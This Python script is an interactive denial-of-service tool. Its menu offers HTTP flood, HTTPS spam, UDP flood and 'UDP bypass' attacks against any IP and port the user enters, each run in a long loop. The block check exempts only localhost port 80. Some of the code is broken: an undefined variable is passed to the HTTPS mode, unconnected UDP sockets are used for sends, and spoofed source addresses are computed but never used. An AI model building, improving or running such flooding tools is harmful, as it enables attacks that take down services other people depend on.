import random
import threading
import time
import requests
import socket
import sys

blocked_ip = "127.0.0.1"
blocked_port = 80

def is_blocked(ip, port):
    return ip == blocked_ip and port == blocked_port

def http_flood(ip, port):
    if is_blocked(ip, port):
        print("[x] Access Denied: You are not allowed to send packets to this IP.")
        return

    message = "GET / HTTP/1.1\r\n"
    message += "Host: {}\r\n".format(ip)
    message += "Connection: keep-alive\r\n"
    message += "Cache-Control: max-age=0\r\n"
    message += "Upgrade-Insecure-Requests: 1\r\n"
    message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n"
    message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    message += "Accept-Encoding: gzip, deflate, sdch\r\n"
    message += "Accept-Language: en-US,en;q=0.8\r\n\r\n"

    print("[+] Starting HTTP Flood Attack...")
    start_time = time.time()
    while time.time() - start_time < 5000:
        if is_blocked(ip, port):
            print("[x] Access Denied: You are not allowed to send packets to this IP.")
            return

        flood_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        flood_socket.connect((ip, port))
        try:
            flood_socket.send(message.encode())
            print("[+] HTTP Request Sent to {}:{}".format(ip, port))
        except:
            pass
        flood_socket.close()

def https_spam(url):
    print("ERROR: Method under maintenance.")
    return
    url_parts = url.split("/")
    ip = url_parts[2]
    message = "GET https://{} HTTP/1.1\r\n".format(ip)
    message += "Host: {}\r\n".format(ip)
    message += "Connection: keep-alive\r\n"
    message += "Cache-Control: max-age=0\r\n"
    message += "Upgrade-Insecure-Requests: 1\r\n"
    message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n"
    message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    message += "Accept-Encoding: gzip, deflate, sdch\r\n"
    message += "Accept-Language: en-US,en;q=0.8\r\n\r\n"

    print("[+] Starting HTTPS Spam Attack...")
    start_time = time.time()
    while time.time() - start_time < 5000:
        headers = {"X-Forwarded-For": str(random.randint(1,255))+"."+str(random.randint(1,255))+"."+str(random.randint(1,255))+"."+str(random.randint(1,255))}
        if is_blocked(ip, 443):
            print("[x] Access Denied: You are not allowed to send packets to this IP.")
            return

        try:
            requests.get(url, headers=headers)
            print("[+] HTTPS Request Sent to {}".format(url))
        except:
            pass

def udp_flood(ip, port):
    print("[+] Starting UDP Flood Attack...")
    start_time = time.time()
    while time.time() - start_time < 5000:
        if is_blocked(ip, port):
            print("[x] Access Denied: You are not allowed to send packets to this IP.")
            return

        try:
            source_ip = "{}.{}.{}.{}".format(*random.sample(range(0, 255), 4))
            source_port = random.randint(1, 65535)
            rand_data = random._urandom(random.randint(1, 1024))
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.sendto(rand_data, (ip, port))
            s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
            s.sendall(rand_data * 10000000000)
            print("[+] UDP Packet Sent to {}:{}".format(ip, port))
        except:
            pass

def udp_bypass(ip, port):
    print("[+] Starting UDP Bypass Attack...")
    start_time = time.time()
    while time.time() - start_time < 5000:
        if is_blocked(ip, port):
            print("[x] Access Denied: You are not allowed to send packets to this IP.")
            return

        try:
            source_ip = "{}.{}.{}.{}".format(*random.sample(range(0, 255), 4))
            source_port = random.randint(1, 65535)

            packet = b"\x00\x00"
            packet += b"\x01\x00"
            packet += b"\x00\x01"
            packet += b"\x00\x00"
            packet += b"\x00\x00"
            packet += b"\x00\x00"
            domain_parts = ip.split(".")
            for part in domain_parts:
                packet += bytes([len(part)])
                packet += part.encode('ascii')
            packet += b"\x00"
            packet += b"\x00\x01"
            packet += b"\x00\x01"
            rand_data = random._urandom(random.randint(1, 1024))
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.sendto(packet, (ip, port))
            s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
            s.sendall(rand_data * 10000000000)
            print("[+] UDP Packet Sent to {}:{}".format(ip, port))
        except:
            pass

def exit_program():
    print("\n[+] Exiting program...")
    sys.exit()

def menu():
    print("██╗   ██╗██╗██╗  ██╗ ██████╗ ███╗   ██╗ ██████╗ ██╗███╗   ██╗██████╗ ")
    print("██║   ██║██║██║ ██╔╝██╔═══██╗████╗  ██║██╔════╝ ██║████╗  ██║██╔══██╗")
    print("██║   ██║██║█████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗██║██╔██╗ ██║██║  ██║")
    print("██║▄▄ ██║██║██╔═██╗ ██║   ██║██║╚██╗██║██║   ██║██║██║╚██╗██║██║  ██║")
    print("╚██████╔╝██║██║  ██╗╚██████╔╝██║ ╚████║╚██████╔╝██║██║ ╚████║██████╔╝")
    print(" ╚══▀▀═╝ ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝ ")
    print("\nSelect a method:\n")
    print("Layer7 methods:\n")
    print("[1] HTTP Flood")
    print("[2] HTTPS Spam\n")
    print("Layer4 methods:\n")
    print("[3] UDP Flood")
    print("[4] UDP Bypass")
    print("[5] Exit program")
    method = int(input("\nSelect a method "))

    if method < 1 or method > 5:
        print("Error: Invalid method selected.")
        menu()
        return

    if method == 5:
        exit_program()

    print("\nEnter the target IP address:")
    ip = input("> ")
    print("\nEnter the target port:")
    port = int(input("> "))

    if method == 1:
        http_flood(ip, port)
    elif method == 2:
        https_spam(url)
    elif method == 3:
        udp_flood(ip, port)
    elif method == 4:
        udp_bypass(ip, port)

    time.sleep(5000)
    print("[+] Attack stopped.")
    
menu()
